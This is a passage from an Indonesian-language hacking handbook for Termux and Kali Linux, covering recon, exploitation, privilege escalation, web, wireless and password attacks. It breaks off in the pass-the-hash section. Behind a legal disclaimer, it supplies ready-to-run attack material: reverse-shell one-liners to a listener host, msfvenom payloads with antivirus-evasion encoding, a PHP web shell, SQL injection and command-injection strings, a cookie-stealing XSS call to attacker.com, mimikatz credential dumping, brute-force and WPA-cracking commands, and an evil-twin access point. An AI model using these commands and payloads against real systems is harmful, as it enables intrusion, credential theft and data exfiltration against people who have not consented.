# BUKU PANDUAN LENGKAP CYBER SECURITY & HACKING
## Dari Pemula hingga Profesional — Legal hingga Ilegal (Untuk Edukasi & Pertahanan)
### Edisi Termux & Kali Linux — 2026

---

> **PENTING**: Buku ini disusun untuk tujuan **edukasi, sertifikasi (CEH, OSCP, eJPT), dan pertahanan sistem**. Teknik "ilegal" dijelaskan agar Anda memahami cara kerja penyerang dan bisa mempertahankan diri. **Menggunakannya pada sistem tanpa izin tertulis adalah tindak pidana** (UU ITE Pasal 30-36 di Indonesia, CFAA di AS, Computer Misuse Act di UK). Selalu dapatkan **izin tertulis** sebelum menguji sistem apapun. Prinsip etika: **Tidak ada yang namanya hack ilegal yang etis — yang ilegal itu penggunaannya, bukan ilmunya.**

---

## DAFTAR ISI

**BAGIAN I: FONDASI (PEMULA)**
1. [Mindset & Etika Hacker](#1-mindset--etika-hacker)
2. [Arsitektur Sistem yang Harus Dikuasai](#2-arsitektur-sistem)
3. [Jaringan: OSI, TCP/IP, DNS, HTTP](#3-jaringan-dasar)
4. [Linux & Terminal Mastery](#4-linux--terminal)
5. [Bahasa Pemrograman untuk Hacker](#5-programming)

**BAGIAN II: LAB & PERSIAPAN**
6. [Setup Lab: DVWA, Metasploitable, HTB](#6-setup-lab)
7. [Tools Wajib & Instalasi](#7-tools-wajib)

**BAGIAN III: FASE SERANGAN (RECON → EXPLOIT)**
8. [Reconnaissance (OSINT)](#8-reconnaissance)
9. [Scanning & Enumeration](#9-scanning)
10. [Vulnerability Analysis](#10-vulnerability-analysis)
11. [Exploitation Dasar](#11-exploitation)
12. [Post-Exploitation & Privilege Escalation](#12-post-exploitation)

**BAGIAN IV: TEKNIK MENENGAH**
13. [Web Hacking: OWASP Top 10](#13-web-hacking)
14. [Wireless Hacking](#14-wireless)
15. [Password Attacks](#15-password-attacks)
16. [Social Engineering](#16-social-engineering)
17. [Evasion & Anti-Forensics](#17-evasion)

**BAGIAN V: TEKNIK LANJUTAN (PROFESIONAL)**
18. [Active Directory Attacks](#18-active-directory)
19. [Red Team Tactics (C2, Lateral Movement)](#19-red-team)
20. [Bug Bounty Methodology](#20-bug-bounty)
21. [Malware Analysis Dasar](#21-malware-analysis)
22. [DFIR: Digital Forensics](#22-dfir)

**BAGIAN VI: PERTAHANAN (BLUE TEAM)**
23. [Hardening & Defensive](#23-blue-team)
24. [SIEM & Monitoring](#24-siem)
25. [Incident Response](#25-incident-response)

**BAGIAN VII: KARIER & SERTIFIKASI**
26. [Roadmap Profesional](#26-roadmap)
27. [Referensi & Cheat Sheet](#27-referensi)

---

## BAGIAN I: FONDASI

### 1. Mindset & Etika Hacker

**Hacker bukan penjahat.** Hacker adalah problem-solver yang berpikir out-of-the-box. Kategori:
- **White Hat**: Hacker etis, bekerja dengan izin (penetration tester, bug bounty hunter).
- **Black Hat**: Penyerang ilegal, motif keuangan/data.
- **Grey Hat**: Di antara keduanya — kadang tanpa izin tapi melaporkan (masih ilegal).

**Aturan main non-negotiable:**
1. **Izin tertulis** sebelum menyentuh sistem apapun (Scope of Work/SOW).
2. **Jangan pernah** merusak data, mengubah, atau menghapus.
3. **Laporkan** temuan ke pemilik sistem, bukan ke publik.
4. **Data yang diakses** = rahasia. Jangan simpan, jangan sebar.
5. **Bug bounty** hanya di program resmi (HackerOne, Bugcrowd, Intigriti).

**Hukum di Indonesia (UU ITE No. 11/2008, diubah 19/2016):**
- Pasal 30: Akses ilegal — ancaman 6-8 tahun penjara.
- Pasal 31: Intersepsi ilegal — ancaman 10 tahun.
- Pasal 32: Pengubahan data — ancaman 8 tahun.
- Pasal 35: Pemalsuan data — ancaman 6 tahun.

### 2. Arsitektur Sistem

**Yang harus Anda pahami sebelum hack:**

**CPU & Memory:**
- Register, Stack, Heap. Buffer overflow terjadi di stack.
- Little-endian vs big-endian (x86 = little-endian).
- Address Space Layout Randomization (ASLR) — proteksi randomisasi alamat memori.

**Operating System:**
- **Linux**: File system hierarchy (`/etc/passwd`, `/etc/shadow`, `/var/log`), permission (rwx, user/group/other), systemd, cron.
- **Windows**: Registry, SAM database, Active Directory, DLL, services.
- **Android**: APK structure (DEX, Manifest, resources), ART runtime, permission model.

**Virtualisasi & Container:**
- VM (VirtualBox, VMware) vs Container (Docker). Container lebih ringan tapi share kernel.

### 3. Jaringan Dasar

**Model OSI (7 Layer) — Ingat dengan "Please Do Not Throw Sausage Pizza Away":**
1. **Physical**: Kabel, sinyal RF.
2. **Data Link**: MAC address, ARP, switch.
3. **Network**: IP address, routing, ICMP (ping).
4. **Transport**: TCP (handshake 3-way: SYN→SYN-ACK→ACK), UDP.
5. **Session**: Manajemen sesi.
6. **Presentation**: Enkripsi (TLS), encoding.
7. **Application**: HTTP, FTP, DNS, SSH.

**Port penting yang harus dihafal:**
| Port | Layanan | Kegunaan Hacking |
|------|---------|------------------|
| 21 | FTP | Anonymous login, bounce attack |
| 22 | SSH | Brute force, tunneling, key theft |
| 23 | Telnet | Clear-text credential sniffing |
| 25/587 | SMTP | Email spoofing, enumeration |
| 53 | DNS | Zone transfer (AXFR), tunneling |
| 80/443 | HTTP/HTTPS | Web hacking utama |
| 110/143 | POP3/IMAP | Email credential theft |
| 135/139/445 | SMB/RPC | EternalBlue, pass-the-hash, share access |
| 1433 | MSSQL | Default creds, xp_cmdshell |
| 1521 | Oracle DB | TNS poisoning |
| 3306 | MySQL | SQL injection → UDF privesc |
| 3389 | RDP | BlueKeep, brute force |
| 5432 | PostgreSQL | SQL injection |
| 5900 | VNC | Brute force (no lockout) |
| 6379 | Redis | Unauthenticated access → SSH key |
| 8080/8443 | HTTP alt | Proxy, admin panel |
| 27017 | MongoDB | Unauthenticated DB dump |

**TCP Flags untuk scanning:**
- **SYN** (S): Half-open scan (stealth).
- **ACK** (A): Firewall rules mapping.
- **FIN** (F), **NULL** (no flags), **XMAS** (F+U+P): Stealth scan untuk non-Windows.

**Subnetting cepat:**
- `/24` = 256 IP (254 host). Contoh: 192.168.1.0/24.
- `/16` = 65,536 IP. Contoh: 10.0.0.0/16.

### 4. Linux & Terminal

**Perintah inti yang harus otomatis:**
```bash
# Navigasi & file
pwd, ls -la, cd, cp, mv, rm, find / -name "*.txt" 2>/dev/null
cat, less, head, tail -f, grep -r "password" /etc/
chmod 755 file, chown user:group file

# Proses & sistem
ps aux | grep apache, top, htop, kill -9 PID
uname -a, whoami, id, sudo -l
df -h, free -m, ip a, ip route

# Jaringan
netstat -tulpn, ss -tulpn
ping -c 4 target, traceroute target
curl -I http://target, wget file
nc -nv target 80, nc -nlvp 4444 (listener)

# Text processing (sangat penting!)
cat access.log | awk '{print $1}' | sort | uniq -c | sort -nr
grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" file.txt
sed 's/old/new/g' file.txt
cut -d: -f1 /etc/passwd
```

**Bash scripting dasar:**
```bash
#!/bin/bash
for ip in $(seq 1 254); do
  ping -c 1 192.168.1.$ip | grep "from" &
done
wait
```

### 5. Programming

**Prioritas bahasa untuk hacker:**
1. **Python**: Automation, exploit writing, scripting. Kuasai: `requests`, `socket`, `scapy`, `pwntools`.
2. **Bash**: System automation, quick exploits.
3. **JavaScript**: Web hacking (XSS, prototype pollution).
4. **SQL**: Injection, database manipulation.
5. **C/C++**: Buffer overflow, exploit development, malware.
6. **PowerShell**: Windows post-exploitation (Empire, PowerView).
7. **Go**: Tools modern (Hugo, some C2 frameworks).

**Contoh Python scanner sederhana:**
```python
import socket
target = "192.168.1.1"
for port in range(1, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"[+] Port {port} terbuka")
    s.close()
```

---

## BAGIAN II: LAB & PERSIAPAN

### 6. Setup Lab

**Prinsip: Jangan pernah latihan di sistem produksi/orang lain. Gunakan lab lokal.**

**Lab lokal (Termux/Kali):**
```bash
# Docker (paling praktis)
docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
# Login: admin/password

# Metasploitable 2 (VMware/VirtualBox)
# Download: https://sourceforge.net/projects/metasploitable/
# Default IP: DHCP, cek dengan netdiscover
# Login: msfadmin/msfadmin

# Metasploitable 3 (Windows-based, butuh Packer)
# OWASP Juice Shop (modern web app)
docker pull bkimminich/juice-shop
docker run -d -p 3000:3000 bkimminich/juice-shop

# WebGoat (Java-based)
docker pull webgoat/webgoat
docker run -d -p 8080:8080 -p 9090:9090 webgoat/webgoat
```

**Lab online (legal, gratis):**
- **TryHackMe** (tryhackme.com): Jalur belajar terstruktur, gratis.
- **HackTheBox** (hackthebox.com): Mesin realistis, ranked.
- **VulnHub** (vulnhub.com): VM vulnerable untuk download.
- **PicoCTF** (picoctf.org): CTF untuk pemula.
- **PortSwigger Web Security Academy**: Gratis, lab web terbaik.
- **OverTheWire: Bandit** (overthewire.org): Linux via SSH.

### 7. Tools Wajib & Instalasi

**Tools inti di Termux/Kali (install via `pkg` di Termux, `apt` di Kali):**

**Recon & OSINT:**
- **nmap**: Network scanner #1. Port scan, OS detection, script scanning.
- **whois**: Info registrasi domain.
- **theHarvester**: Email/subdomain enumeration dari sumber publik.
- **sublist3r**: Subdomain enumeration via search engine.
- **amass**: Subdomain enumeration skala besar (OWASP).
- **shodan**: Search engine untuk device IoT/server (CLI: `shodan`).
- **maltego**: Visualisasi OSINT (GUI, berat di Termux).

**Scanning & Enumeration:**
- **nmap**: (lihat atas).
- **masscan**: Scanner port ultra-cepat (1000x nmap). Hati-hati, sangat noisy.
- **nikto**: Web vulnerability scanner (XSS, SQLi, outdated software).
- **gobuster**: Directory/file brute-forcer. Mode: dir, dns, vhost, fuzz.
- **feroxbuster**: Gobuster modern, recursive, lebih cepat (Rust).
- **dirsearch**: Alternative directory brute-forcer (Python).
- **enum4linux**: SMB/RPC enumeration untuk Windows/Linux Samba.
- **smbclient**: Akses share SMB (`smbclient -L //target`).
- **snmpwalk**: SNMP enumeration (community string "public"/"private").
- **ldapsearch**: LDAP enumeration untuk Active Directory.

**Web Hacking:**
- **burpsuite**: Intercepting proxy #1. Community Edition gratis. Modul: Proxy, Repeater, Intruder, Decoder, Comparer.
- **sqlmap**: SQL injection automation. Support: UNION, blind, time-based, OOB.
- **nikto**: (lihat atas).
- **wpscan**: WordPress scanner (plugin/theme vulnerability, user enumeration).
- **commix**: Command injection tool.
- **xsstrike**: Advanced XSS detection (Python).
- **dalfox**: XSS scanner modern (Go).
- **httpx**: HTTP probing toolkit (cek status, title, tech stack).
- **nuclei**: Vulnerability scanner berbasis template (YAML). Sangat powerful.

**Exploitation:**
- **metasploit-framework**: Exploit framework #1. `msfconsole`, `msfvenom`.
- **searchsploit**: Database exploit lokal (Exploit-DB). Offline, cepat.
- **msfvenom**: Payload generator (reverse shell, bind shell, meterpreter).
- **exploitdb**: Repo exploit (terintegrasi dengan searchsploit).
- **beef-xss**: Browser Exploitation Framework (hook browser via XSS).
- **commix**: (lihat atas).

**Password Cracking:**
- **hashcat**: GPU-based cracker. Support 300+ hash type. Mode: dictionary, brute-force, mask, rule-based.
- **john (john the ripper)**: CPU-based cracker. Format: raw-md5, nt, sha512crypt, etc.
- **hydra**: Network login brute-forcer. Support: SSH, FTP, HTTP, SMB, RDP, dan 50+ protokol.
- **medusa**: Parallel login brute-forcer (alternatif Hydra).
- **ncrack**: Network auth cracker (Nmap project).
- **cewl**: Custom wordlist generator dari website (crawl & extract kata).
- **crunch**: Wordlist generator (pattern-based: `crunch 8 8 -t @@@@%%%%`).

**Wireless:**
- **aircrack-ng**: Suite WEP/WPA cracking. Komponen: airmon-ng, airodump-ng, aireplay-ng, aircrack-ng.
- **wifite**: Automated wireless auditor (wrapper aircrack).
- **reaver**: WPS PIN attack (brute force WPS).
- **bully**: Alternatif Reaver, lebih stabil.
- **kismet**: Wireless network detector, sniffer, IDS.
- **hcxdumptool**: Capture handshake PMKID (tanpa client).
- **hcxpcapngtool**: Convert capture untuk hashcat.
- **bettercap**: MITM framework (ARP spoofing, DNS spoofing, HSTS bypass, BLE).

**Sniffing & MITM:**
- **wireshark**: Packet analyzer GUI #1. Filter: `http.request.method == "POST"`, `tcp.port == 80`.
- **tcpdump**: CLI packet capture. `tcpdump -i wlan0 -w capture.pcap`.
- **bettercap**: (lihat atas).
- **ettercap**: Legacy MITM suite (ARP poisoning, DNS spoofing).
- **mitmproxy**: Intercepting proxy untuk HTTP/HTTPS (Python, scriptable).
- **responder**: LLMNR/NBT-NS/MDNS poisoner (Windows credential harvesting).
- **sslstrip**: Strip HTTPS → HTTP (hanya HTTP, tidak work di HSTS modern).

**Post-Exploitation:**
- **linpeas**: Linux privilege escalation automated script. Cari: SUID, cron, capabilities, kernel exploit.
- **winpeas**: Windows counterpart.
- **linenum.sh**: Alternative Linux enum (manual feel).
- **pspy**: Monitor process Linux tanpa root (detek cron job).
- **mimikatz**: Windows credential dumper (password, hash, ticket dari LSASS memory). **Sangat ilegal di sistem tanpa izin.**
- **bloodhound**: Active Directory attack path analyzer (graph database).
- **powerview**: PowerShell AD recon (part of PowerSploit).
- **evil-winrm**: WinRM shell untuk Windows (port 5985/5986).
- **netcat (nc)**: Swiss army knife. Reverse shell, listener, file transfer.
- **socat**: Netcat on steroid. Encrypted tunnel, port forward.
- **chisel**: TCP tunnel over HTTP (bypass firewall).
- **ligolo-ng**: Modern tunneling/pivoting tool (Go).

**Forensics & Analysis:**
- **volatility**: Memory forensics (RAM dump analysis). Plugin: `pslist`, `netscan`, `malfind`.
- **autopsy**: Disk forensics GUI (Sleuth Kit).
- **binwalk**: Firmware/binary analysis (extract embedded file).
- **strings**: Extract readable string dari binary.
- **ghidra**: Reverse engineering framework NSA (decompiler gratis).
- **radare2 (r2)**: CLI reverse engineering. `r2 -d binary`, `aaa`, `afl`.
- **gdb**: Debugger. Dengan **pwndbg** atau **gef** plugin untuk exploit dev.
- **upx**: Unpacker/packer executable.

**Reporting:**
- **dradis**: Collaboration & reporting framework.
- **faraday**: Multi-user pentest IDE.
- **cherrytree**: Note-taking dengan hierarki (favorit pentester).
- **obsidian**: Markdown knowledge base (modern).

---

## BAGIAN III: FASE SERANGAN

### 8. Reconnaissance (OSINT)

**Fase paling penting — 70% keberhasilan pen test ada di sini.**

**Passive Recon (tanpa menyentuh target):**
```bash
# WHOIS & DNS
whois target.com
dig target.com ANY
dig @8.8.8.8 target.com AXFR          # Zone transfer (jarang berhasil tapi coba)
nslookup -type=MX target.com

# Subdomain enumeration
sublist3r -d target.com
amass enum -passive -d target.com
assetfinder --subs-only target.com

# Email & employee
theHarvester -d target.com -b google,linkedin,github -l 500

# Tech stack
whatweb target.com
httpx -l subs.txt -title -tech-detect -status-code

# Google Dorking (site: operator)
site:target.com ext:sql | ext:bak | ext:old
site:target.com intitle:"index of"
site:target.com inurl:admin
site:target.com ext:log | ext:txt | ext:env
site:pastebin.com "target.com"
filetype:pdf site:target.com "confidential"

# GitHub dorking
"target.com" password
"target.com" api_key
filename:.env target.com
```

**Active Recon (menyentuh target — butuh izin):**
```bash
# Ping sweep (host discovery)
nmap -sn 192.168.1.0/24
netdiscover -r 192.168.1.0/24

# DNS brute force
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt
```

### 9. Scanning & Enumeration

**Nmap — Mastery:**
```bash
# Host discovery saja (no port scan)
nmap -sn 10.10.10.0/24

# Quick scan top 1000 port
nmap -T4 10.10.10.5

# Full port scan (65535 port) — WAJIB, port tersembunyi sering di high port
nmap -p- 10.10.10.5

# Service version + OS detection + default script
nmap -sV -sC -O -p 22,80,443 10.10.10.5

# Aggressive (semua di atas + traceroute)
nmap -A 10.10.10.5

# Stealth SYN scan (butuh root)
sudo nmap -sS 10.10.10.5

# UDP scan (DNS, SNMP, DHCP — lambat tapi penting)
sudo nmap -sU --top-ports 100 10.10.10.5

# NSE script spesifik
nmap --script vuln -p 80,443 10.10.10.5          # Cari vulnerability
nmap --script smb-vuln* -p 445 10.10.10.5        # SMB vulnerability
nmap --script http-enum -p 80 10.10.10.5         # HTTP enumeration
nmap --script dns-brute target.com               # DNS brute force

# Output format
nmap -oA scan 10.10.10.5    # Normal, XML, Grepable
```

**Enumeration per layanan:**
```bash
# SMB (Windows file sharing)
enum4linux -a 10.10.10.5
smbclient -L //10.10.10.5 -N          # Null session
smbclient //10.10.10.5/share -N       # Akses share
nmap --script smb-os-discovery,smb-enum-shares -p 445 10.10.10.5

# SNMP (network device)
snmpwalk -c public -v1 10.10.10.5
onesixtyone -c /usr/share/wordlists/snmp.txt 10.10.10.5

# Web
whatweb http://10.10.10.5
nikto -h http://10.10.10.5
gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak
feroxbuster -u http://10.10.10.5 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# FTP
ftp 10.10.10.5
# Coba anonymous:anonymous
nmap --script ftp-anon,ftp-vsftpd-backdoor -p 21 10.10.10.5

# SSH
nc 10.10.10.5 22                    # Banner grabbing
nmap --script ssh2-enum-algos,ssh-hostkey -p 22 10.10.10.5
```

### 10. Vulnerability Analysis

**Alur analisis:**
1. **Identifikasi versi service** (`nmap -sV`).
2. **Cari CVE**: `searchsploit <service> <version>`, CVE database (nvd.nist.gov).
3. **Validasi manual**: Baca advisory, cek apakah benar vulnerable.
4. **Prioritaskan**: CVSS score + exploitability + business impact.

**Tools:**
```bash
# Search exploit lokal
searchsploit apache 2.4.49
searchsploit -m 50383        # Copy exploit ke cwd

# Nuclei (template-based scanning)
nuclei -u http://10.10.10.5 -t cves/ -t vulnerabilities/
nuclei -l targets.txt -severity critical,high

# OpenVAS (full vulnerability scanner, berat)
sudo openvas-start
```

### 11. Exploitation Dasar

**Reverse Shell vs Bind Shell:**
- **Bind**: Target listen, attacker connect. `nc -nlvp 4444` di target.
- **Reverse**: Attacker listen, target connect. **Lebih sering work** (bypass firewall outbound).

**Setup listener:**
```bash
nc -nlvp 4444                    # Netcat listener
nc -nlvp 4444 -e /bin/bash       # Bind shell (target)
```

**Payload generation dengan msfvenom:**
```bash
# Linux reverse shell (ELF)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Windows reverse shell (EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Windows dengan encoding (bypass antivirus dasar)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Web shell (PHP)
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# One-liner bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw

# List payload
msfvenom -l payloads | grep linux
```

**Metasploit workflow:**
```bash
msfconsole
msf6 > search type:exploit name:vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > show options
msf6 > set RHOSTS 10.10.10.5
msf6 > set LHOST 10.10.14.5
msf6 > set PAYLOAD cmd/unix/interact
msf6 > exploit

# Meterpreter commands (setelah session)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
meterpreter > download /etc/passwd
meterpreter > upload local.txt /tmp/
meterpreter > hashdump          # Windows SAM
meterpreter > run post/linux/gather/hashdump
```

**Web shell manual (upload via vulnerable upload form):**
```php
<?php system($_GET['cmd']); ?>
# Akses: http://target/uploads/shell.php?cmd=id
```

**Reverse shell one-liner (banyak situasi):**
```bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PHP
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat (versi modern dengan -e)
nc -e /bin/bash 10.10.14.5 4444

# Perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

### 12. Post-Exploitation & Privilege Escalation

**Linux Privilege Escalation:**
```bash
# Enumerasi otomatis
./linpeas.sh
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Enumerasi manual
sudo -l                          # Command apa yang bisa sudo tanpa password
find / -perm -4000 2>/dev/null   # SUID binaries
find / -writable -type d 2>/dev/null  # World-writable directory
cat /etc/crontab                 # Cron job
ls -la /etc/passwd /etc/shadow   # Permission file
cat /etc/passwd | grep sh        # User dengan shell
ps aux | grep root               # Process running as root
env                              # Environment variable (cari password)
history                          # Command history
ip a; ip route                   # Network info (pivoting)
```

**Teknik Linux PrivEsc umum:**
1. **SUID binary**: Binary dengan SUID bit yang vulnerable (find, vim, less, nmap versi lama).
   ```bash
   # Contoh: find SUID
   find . -exec /bin/sh -p \; -quit
   ```
2. **Sudo misconfiguration**: `sudo -l` menunjukkan `(ALL) NOPASSWD: /usr/bin/vim` → `sudo vim -c ':!/bin/sh'`.
3. **Cron job writable script**: Edit script yang dijalankan root.
4. **Kernel exploit**: Cek `uname -r`, cari exploit (DirtyPipe CVE-2022-0847, PwnKit CVE-2021-4034).
5. **Capabilities**: `getcap -r / 2>/dev/null` → `cap_setuid` bisa abuse.
6. **Writable /etc/passwd**: Tambah user root sendiri.
7. **Docker group**: `docker run -v /:/mnt alpine chroot /mnt` → root.

**Windows Privilege Escalation:**
```cmd
# Enumerasi
whoami /priv
whoami /groups
systeminfo
net user
net localgroup administrators
sc query state= all

# Tools
winpeas.exe
.\Seatbelt.exe -group=all

# Teknik umum:
# 1. Unquoted Service Path: C:\Program Files\App\sub dir\service.exe
#    → drop malicious exe di path tanpa quote
# 2. Weak service permission: icacls → writable → replace binary
# 3. AlwaysInstallElevated: MSI jalan sebagai SYSTEM
# 4. DLL Hijacking: Cari DLL yang tidak ditemukan, drop di PATH
# 5. Potato attack (RottenPotato, JuicyPotato, PrintSpoofer): SeImpersonatePrivilege
# 6. Stored credential: cmdkey /list, vaultcmd
```

**Credential Harvesting (setelah akses):**
```bash
# Linux
cat /etc/passwd
cat /etc/shadow              # Butuh root
grep -r "password" /etc/ 2>/dev/null
cat ~/.bash_history
find / -name "*.kdbx" 2>/dev/null    # KeePass database

# Windows (dengan mimikatz — ilegal tanpa izin!)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

---

## BAGIAN IV: TEKNIK MENENGAH

### 13. Web Hacking (OWASP Top 10)

**Setup: Burp Suite sebagai proxy**
1. Buka Burp → Proxy → Options → bind 127.0.0.1:8080.
2. Browser set proxy ke 127.0.0.1:8080.
3. Install Burp CA certificate untuk HTTPS.
4. Intercept request, kirim ke Repeater untuk modifikasi manual.

**A. SQL Injection (SQLi)**
```bash
# Deteksi
' OR '1'='1
' OR 1=1-- -
admin'--
' UNION SELECT 1,2,3-- -

# Enumerasi database (MySQL)
' UNION SELECT 1,database(),version()-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,username,password FROM users-- -

# Blind SQLi (boolean-based)
' AND 1=1-- -        # True
' AND 1=2-- -        # False
' AND SUBSTRING(database(),1,1)='a'-- -

# Time-based blind
' AND IF(1=1,SLEEP(5),0)-- -

# Automatisasi dengan sqlmap
sqlmap -u "http://target/page.php?id=1" --batch
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D dbname --tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump
sqlmap -u "http://target/login.php" --data="user=admin&pass=admin" --level=5 --risk=3
sqlmap -r request.txt --batch          # Dari file request Burp
```

**B. Cross-Site Scripting (XSS)**
```html
<!-- Reflected XSS -->
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onfocus=alert(1) autofocus="

<!-- Stored XSS (paling berbahaya — tersimpan di DB) -->
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

<!-- DOM-based XSS -->
#<img src=x onerror=alert(1)>

<!-- Bypass filter -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<iframe src="javascript:alert(1)">
```
Tools: `dalfox url http://target/?q=test`, `xsstrike -u "http://target/?q=test"`

**C. Command Injection**
```bash
; id
| id
&& id
; cat /etc/passwd
$(id)
`id`
; nc -e /bin/bash 10.10.14.5 4444
```

**D. File Inclusion**
```bash
# LFI (Local File Inclusion)
http://target/page.php?file=../../../../etc/passwd
http://target/page.php?file=../../../../etc/passwd%00    # Null byte (PHP < 5.3)
http://target/page.php?file=php://filter/convert.base64-encode/resource=index.php

# LFI → RCE via log poisoning
http://target/page.php?file=../../../../var/log/apache2/access.log
# Inject PHP shell via User-Agent, include log file

# RFI (Remote File Inclusion)
http://target/page.php?file=http://attacker.com/shell.txt
```

**E. File Upload**
```bash
# Bypass extension filter
shell.php → shell.php.jpg → shell.pHp → shell.php%00.jpg
shell.php5, shell.phtml, shell.phar

# Bypass content-type check
# Upload file dengan Content-Type: image/jpeg tapi isi PHP

# Bypass magic bytes
# Tambah GIF89a; di awal file PHP
```

**F. Server-Side Request Forgery (SSRF)**
```bash
# Akses internal network
http://target/fetch?url=http://127.0.0.1:8080/admin
http://target/fetch?url=http://169.254.169.254/latest/meta-data/    # AWS metadata
http://target/fetch?url=file:///etc/passwd
http://target/fetch?url=http://localhost:6379/INFO                  # Redis
```

**G. Insecure Deserialization**
```bash
# PHP unserialize
O:8:"stdClass":1:{s:4:"name";s:6:"attack";}

# Java deserialization (ysoserial)
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/bash 10.10.14.5 4444' > payload.ser
```

**H. Authentication Bypass**
```bash
# SQL injection di login
' OR '1'='1'--
admin'--

# JWT attacks
# 1. Alg none: ubah header {"alg":"none"}
# 2. Weak secret: john jwt.txt --wordlist=rockyou.txt
# 3. Kid injection: path traversal ke file yang dikontrol

# Session fixation, session hijacking via XSS
```

**I. IDOR (Insecure Direct Object Reference)**
```bash
# Ubah parameter
http://target/user?id=1001 → id=1002
http://target/api/v1/users/1001 → /users/1002
```

**J. Security Misconfiguration**
```bash
# Default credentials
admin:admin, admin:password, root:root
# Directory listing, backup file (.bak, .old, ~)
# HTTP methods: PUT, DELETE, TRACE
curl -X OPTIONS http://target
curl -X PUT -d "shell code" http://target/shell.php    # Jika PUT enable
```

### 14. Wireless Hacking

**Hanya untuk lab sendiri atau jaringan dengan izin tertulis!**

```bash
# Setup monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0          # Membuat wlan0mon

# Scan network
sudo airodump-ng wlan0mon

# Capture handshake (target AP + client)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Deauth client untuk memaksa reconnect
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# PMKID attack (tanpa client)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.txt pmkid.pcapng
hashcat -m 22000 hash.txt /usr/share/wordlists/rockyou.txt

# WPS attack
sudo wash -i wlan0mon
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# WEP attack (jadul tapi masih ada)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
sudo aircrack-ng capture-01.cap
```

**Evil Twin Attack (phishing WiFi):**
```bash
# Buat fake AP dengan nama sama
sudo airbase-ng -e "TargetWiFi" -c 6 wlan0mon
# + DHCP server + captive portal phishing page
```

### 15. Password Attacks

**Hash identification:**
```bash
hashid 5f4dcc3b5aa765d61d8327deb882cf99          # MD5
hashcat --example-hashes | grep -i md5
```

**Wordlist:**
- `/usr/share/wordlists/rockyou.txt` (Kali default, 14 juta password)
- `/usr/share/wordlists/seclists/Passwords/` (SecLists — install: `apt install seclists`)
- Generate custom: `cewl -w wordlist.txt -d 2 -m 5 http://target.com`

**Cracking:**
```bash
# Hashcat (GPU — jauh lebih cepat)
hashcat -m 0 hash.txt rockyou.txt              # MD5
hashcat -m 1000 hash.txt rockyou.txt           # NTLM (Windows)
hashcat -m 1800 hash.txt rockyou.txt           # sha512crypt (Linux)
hashcat -m 22000 hash.txt rockyou.txt          # WPA/WPA2
hashcat -m 0 hash.txt rockyou.txt -r rules/best64.rule    # Rule-based
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l?l?l    # Brute-force 8 char lowercase
hashcat -m 0 hash.txt -a 3 ?u?l?l?l?l?l?l?d?d  # Mask attack

# John the Ripper (CPU)
john --wordlist=rockyou.txt hash.txt
john --format=raw-md5 hash.txt
john --show hash.txt

# Online attack (hydra)
hydra -l admin -P rockyou.txt ssh://10.10.10.5
hydra -L users.txt -P rockyou.txt ftp://10.10.10.5
hydra -l admin -P rockyou.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid" -t 4
hydra -l administrator -P rockyou.txt rdp://10.10.10.5
hydra -C creds.txt smb://10.10.10.5            # Combo list (user:pass)
```

**Passing the Hash (Windows):**
```bash
# Dengan crackmapexec (sekarang netexec)
nxc smb 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
# Atau dengan impacket
